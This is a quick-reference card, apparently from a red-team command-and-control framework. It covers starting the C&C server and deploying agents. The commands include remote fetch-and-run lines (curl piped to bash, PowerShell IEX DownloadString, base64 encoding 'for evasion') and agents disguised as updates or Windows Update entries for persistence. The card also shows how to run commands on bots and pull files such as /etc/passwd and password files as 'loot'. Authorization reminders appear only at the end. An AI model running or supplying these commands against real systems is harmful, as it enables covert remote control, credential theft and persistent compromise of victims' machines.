# 🎯 Red Team C&C - Quick Reference Card

## Start C&C Server
```bash
python src/cnc_server.py
# Server runs on http://0.0.0.0:5000
```

## Configure Payloads
```bash
# All payloads
python build_payload.py --all --server http://10.0.0.1:5000 --password MyP@ss123

# Single payload
python build_payload.py --payload linux_agent.sh --server http://10.0.0.1:5000 --password MyP@ss123
```

## Deploy Agents

### Linux/macOS
```bash
# Direct execution
curl http://your-server/linux_agent.sh | bash

# With environment variables
CNC_SERVER="http://10.0.0.1:5000" SSH_PASSWORD="pass" bash linux_agent.sh

# Via SSH
scp linux_agent.sh user@target:/tmp/update.sh
ssh user@target "bash /tmp/update.sh"
```

### Windows
```powershell
# Direct execution (hidden)
IEX (New-Object Net.WebClient).DownloadString('http://your-server/windows_agent.ps1')

# Local execution
.\windows_agent.ps1 -Hidden -CncServer "http://10.0.0.1:5000" -SshPassword "pass"

# Encoded (for evasion)
$c = (New-Object Net.WebClient).DownloadString('http://your-server/windows_agent.ps1')
$b = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))
powershell -EncodedCommand $b
```

### Python (Cross-Platform)
```bash
# Daemon mode (background, silent)
python python_agent.py --server http://10.0.0.1:5000 --daemon

# Verbose mode (for testing)
python python_agent.py --server http://10.0.0.1:5000 --verbose

# No persistence (testing)
python python_agent.py --server http://10.0.0.1:5000 --no-persist --verbose
```

## Control Bots

### Execute Command
```bash
curl -X POST http://localhost:5000/send_command \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target-1234", "command": "whoami"}'
```

### Download File from Target
```bash
curl -X POST http://localhost:5000/download_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target-1234", "remote_path": "/etc/passwd", "local_path": "./passwd.txt"}'
```

### Upload File to Target
```bash
curl -X POST http://localhost:5000/upload_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target-1234", "local_path": "./tool.sh", "remote_path": "/tmp/tool.sh"}'
```

### PowerShell Control
```powershell
# Execute command
$body = @{bot_id="target-1234"; command="hostname"} | ConvertTo-Json
Invoke-RestMethod -Uri "http://localhost:5000/send_command" -Method POST -ContentType "application/json" -Body $body

# Download file
$body = @{bot_id="target-1234"; remote_path="C:\passwords.txt"; local_path="./loot.txt"} | ConvertTo-Json
Invoke-RestMethod -Uri "http://localhost:5000/download_file" -Method POST -ContentType "application/json" -Body $body
```

## Useful Commands

### Recon
```bash
# System info
{"bot_id": "target", "command": "uname -a"}  # Linux
{"bot_id": "target", "command": "systeminfo"}  # Windows

# Network info
{"bot_id": "target", "command": "ip a"}  # Linux
{"bot_id": "target", "command": "ipconfig /all"}  # Windows

# User info
{"bot_id": "target", "command": "id"}  # Linux
{"bot_id": "target", "command": "whoami /all"}  # Windows

# Processes
{"bot_id": "target", "command": "ps aux"}  # Linux
{"bot_id": "target", "command": "tasklist"}  # Windows
```

### Persistence Check
```bash
# Linux
{"bot_id": "target", "command": "systemctl status system-monitor.service"}
{"bot_id": "target", "command": "crontab -l"}

# Windows
{"bot_id": "target", "command": "schtasks /query | findstr WindowsUpdate"}
{"bot_id": "target", "command": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}
```

## Cleanup

### Remove Persistence - Linux
```bash
# systemd
sudo systemctl stop system-monitor.service
sudo systemctl disable system-monitor.service
sudo rm /etc/systemd/system/system-monitor.service

# cron
crontab -l | grep -v agent | crontab -

# RC files
sed -i '/System monitor/d' ~/.bashrc ~/.profile
```

### Remove Persistence - Windows
```powershell
# Registry
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate"

# Scheduled Task
Unregister-ScheduledTask -TaskName "WindowsUpdateCheck" -Confirm:$false

# Startup folder
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.vbs" -Force
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Agent not registering | Check firewall, verify C&C is running, test with curl |
| Connection timeout | Increase timeout in payload, check network |
| Persistence not working | Check user permissions, try alternative method |
| Commands not executing | Verify SSH credentials, check SSH is enabled |

## Files & Documentation

| File | Purpose |
|------|---------|
| `README.md` | Main documentation |
| `RED_TEAM_GUIDE.md` | Comprehensive deployment guide |
| `FRAMEWORK_SUMMARY.md` | Feature summary and checklist |
| `payloads/README.md` | Payload-specific documentation |
| `test_framework.py` | Test all components |
| `build_payload.py` | Configure payloads |

## Remember

- ✅ Get written authorization
- ✅ Stay within scope
- ✅ Document all actions
- ✅ Test in lab first
- ✅ Have cleanup plan
- ❌ Never use without permission

---
**For authorized penetration testing only**
